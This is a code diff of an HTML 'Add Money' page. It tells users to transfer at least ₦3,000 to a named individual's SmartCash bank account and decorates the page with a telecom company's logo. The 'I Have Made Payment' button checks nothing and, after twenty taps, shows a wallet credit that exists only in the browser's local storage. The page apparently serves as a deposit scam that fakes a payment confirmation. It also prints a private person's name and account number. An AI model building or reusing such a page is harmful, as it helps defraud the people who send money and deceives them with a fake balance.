@@ -1,145 +1,167 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Add Money</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background: #fff;
+      background: #f9f9f9;
+      margin: 0;
       padding: 20px;
-    }
-    .card {
-      background: #fff0f0;
-      border: 1px solid #ffd6d6;
-      border-radius: 15px;
-      padding: 20px;
-      box-shadow: 0 0 10px #f3caca;
-    }
-    .title {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 15px;
-      color: #d90000;
-    }
-    input[type="number"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 15px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-    }
-    .btn {
-      background-color: #d90000;
-      color: white;
-      border: none;
-      padding: 12px;
-      width: 100%;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .account-info {
-      display: none;
-      margin-top: 20px;
-      background: #fff;
-      border: 1px solid #ccc;
-      border-radius: 15px;
-      padding: 15px;
-    }
-    .info-title {
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-    .popup {
-      position: fixed;
-      top: 30%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: white;
-      border: 1px solid #ddd;
-      box-shadow: 0 0 10px #aaa;
-      padding: 20px;
-      border-radius: 15px;
-      text-align: center;
-      display: none;
-      z-index: 10;
-    }
-    .overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.4);
-      display: none;
-      z-index: 5;
-    }
+      position: relative;
+      overflow-x: hidden;
+    }.container {
+  max-width: 400px;
+  margin: auto;
+  background: #fff;
+  padding: 20px;
+  border-radius: 12px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+  position: relative;
+  z-index: 2;
+}
+
+h2 {
+  color: #d9001b;
+  text-align: center;
+}
+
+input[type="number"] {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background-color: #d9001b;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.popup {
+  display: none;
+  padding: 15px;
+  background-color: #fff0f0;
+  border: 1px solid #d9001b;
+  color: #d9001b;
+  text-align: center;
+  border-radius: 8px;
+  margin-bottom: 15px;
+}
+
+.account-info {
+  display: none;
+  background: #fff0f0;
+  padding: 20px;
+  border-radius: 10px;
+  margin-top: 20px;
+}
+
+.account-info p {
+  margin: 10px 0;
+}
+
+.logo-scatter {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.logo-piece {
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  background-image: url('airtel-logo.png');
+  background-size: contain;
+  background-repeat: no-repeat;
+  animation: scatterIn 2s ease-in-out forwards;
+}
+
+@keyframes scatterIn {
+  0% {
+    transform: translate(calc(50vw - 10px), calc(50vh - 10px)) scale(0.1);
+    opacity: 0;
+  }
+  100% {
+    transform: translate(0, 0) scale(1);
+    opacity: 0.1;
+  }
+}
+
   </style>
-</head>
-<body>
-  <div class="overlay" id="overlay"></div>
-  <div class="popup" id="popup"></div>
+</head><body>
+  <div class="logo-scatter" id="logoScatter"></div>  <div class="container">
+    <h2>Add Money</h2><div class="popup" id="popup"></div>
 
-  <div class="card">
-    <div class="title">Add Money</div>
-    <input type="number" id="amountInput" placeholder="Enter amount (₦3,000 min)" />
-    <button class="btn" onclick="continuePayment()">Continue</button>
+<div id="formSection">
+  <input type="number" id="amount" placeholder="Enter amount (min ₦3000)" />
+  <button onclick="continueToPay()">Continue</button>
+</div>
 
-    <div class="account-info" id="accountSection">
-      <div class="info-title">Send ₦3,000 to:</div>
-      <p><b>Name:</b> EMMANUEL OKWUNNA</p>
-      <p><b>Bank:</b> SmartCash Payment Service Bank</p>
-      <p><b>Account:</b> 812 489 0070</p>
-      <button class="btn" onclick="confirmPayment()">I Have Made Payment</button>
-    </div>
-  </div>
+<div class="account-info" id="accountInfo">
+  <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
+  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+  <p><strong>Account Number:</strong> 812 489 0070</p>
+  <button onclick="tapPayment()">I Have Made Payment</button>
+</div>
 
-  <script>
-    const overlay = document.getElementById('overlay');
-    const popup = document.getElementById('popup');
-    const accountSection = document.getElementById('accountSection');
-    const amountInput = document.getElementById('amountInput');
-
+  </div>  <script>
     let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
     let balance = parseInt(localStorage.getItem('balance') || '0');
 
-    function showPopup(message, duration = 2000) {
+    function showPopup(message) {
+      const popup = document.getElementById("popup");
       popup.innerText = message;
-      overlay.style.display = 'block';
-      popup.style.display = 'block';
-      setTimeout(() => {
-        overlay.style.display = 'none';
-        popup.style.display = 'none';
-      }, duration);
+      popup.style.display = "block";
+      setTimeout(() => popup.style.display = "none", 3000);
     }
 
-    function continuePayment() {
-      const amount = parseInt(amountInput.value);
-      if (!amount || amount < 3000) {
-        showPopup("Please input minimum of ₦3,000", 2500);
+    function continueToPay() {
+      const amount = parseInt(document.getElementById("amount").value);
+      if (isNaN(amount) || amount < 3000) {
+        showPopup("Please input a minimum of ₦3000");
         return;
       }
-
-      showPopup("Please wait...", 2000);
+      showPopup("Please wait...");
       setTimeout(() => {
-        accountSection.style.display = 'block';
-      }, 2000);
+        document.getElementById("formSection").style.display = 'none';
+        document.getElementById("accountInfo").style.display = 'block';
+      }, 1500);
     }
 
-    function confirmPayment() {
+    function tapPayment() {
       tapCount++;
       localStorage.setItem('tapCount', tapCount);
-
+      showPopup("We are confirming your transaction. Please wait...");
       if (tapCount >= 20) {
         balance += 3000;
         localStorage.setItem('balance', balance);
-        localStorage.setItem('tapCount', 0);
-        showPopup("₦3,000 has been added to your wallet!", 3000);
-      } else {
-        showPopup("Please wait... Confirming transaction", 2000);
+        localStorage.setItem('tapCount', '0');
+        showPopup("₦3000 added to your wallet!");
       }
     }
-  </script>
-</body>
-</html>
+
+    // Logo scatter animation
+    function createLogoScatter() {
+      const scatter = document.getElementById("logoScatter");
+      for (let i = 0; i < 40; i++) {
+        const piece = document.createElement("div");
+        piece.className = "logo-piece";
+        piece.style.top = Math.random() * window.innerHeight + 'px';
+        piece.style.left = Math.random() * window.innerWidth + 'px';
+        scatter.appendChild(piece);
+      }
+    }
+    createLogoScatter();
+  </script></body></html>
